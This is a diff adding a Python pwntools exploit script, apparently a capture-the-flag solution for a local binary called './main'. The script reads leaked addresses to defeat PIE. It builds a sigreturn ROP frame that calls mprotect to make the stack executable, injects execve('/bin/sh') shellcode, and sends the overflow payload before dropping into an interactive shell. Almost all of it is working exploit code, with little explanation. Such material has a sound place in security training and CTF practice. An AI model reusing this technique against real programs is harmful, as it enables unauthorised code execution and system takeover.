@@ -1,0 +1,98 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
+from pwn import *
+context.arch = 'amd64'
+context.os = 'linux'
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF(args.EXE or './main')
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+io = start()
+
+#--------------------[ STEP 1 : PIE_BASE ]--------------------
+
+io.recvuntil(b'>> Secure channel established at ')
+leak_vals = io.recvline().split(b':')
+log.success	(f"leak_vals : {leak_vals}")
+buf_addr = int(leak_vals[0],16)
+vuln_addr = int(leak_vals[1].strip()[:-1],16)
+log.success(f"buf @ : {hex(buf_addr)} ,, vuln @ : {hex(vuln_addr)}")
+pie_base = vuln_addr - exe.sym['vuln']
+exe.address = pie_base
+log.success(f"exe.address @ {hex(exe.address)}")
+
+#--------------------[ STEP 2 : MAKE STACk RWX WITH MPROTECT SYSCALL ]--------------------
+
+# Setup ROP and gadgets
+rop = ROP(exe)
+syscall_gad = rop.find_gadget(['syscall'])[0]
+ret_gad = rop.find_gadget(['ret'])[0]
+
+# Page align the buffer address for mprotect
+page_size = 0x1000
+page_aligned_addr = buf_addr & ~(page_size - 1)
+
+# Build SigreturnFrame for mprotect syscall
+frame = SigreturnFrame()
+frame.rax = 10            # syscall number for mprotect
+frame.rdi = page_aligned_addr  # page-aligned address
+frame.rsi = page_size     # length (one page)
+frame.rdx = 7             # PROT_READ | PROT_WRITE | PROT_EXEC
+frame.rip = syscall_gad   # syscall; ret gadget address
+frame.rsp = buf_addr  # new stack pointer after sigreturn
+
+#--------------------[ STEP 3 : SHELLCODE ]--------------------
+
+shellcode = asm('''
+    xor rsi, rsi                    
+    push rsi                        
+    mov rdi, 0x68732f2f6e69622f     
+    push rdi
+    mov rdi, rsp                    
+    xor rdx, rdx                    
+    mov al, 0x3b                    
+    syscall
+''')
+
+#--------------------[ STEP 4 : PAYLOAD ]--------------------
+
+offset = 16
+payload=p64(buf_addr+8)
+payload+= shellcode
+payload+= b'\x90' * (72 - len(payload) )
+payload+= p64(syscall_gad)
+payload+=bytes(frame)
+
+io.recvuntil(b'>> Root key required to proceed:\n')
+io.sendline(payload)
+
+
+
+io.interactive()
+
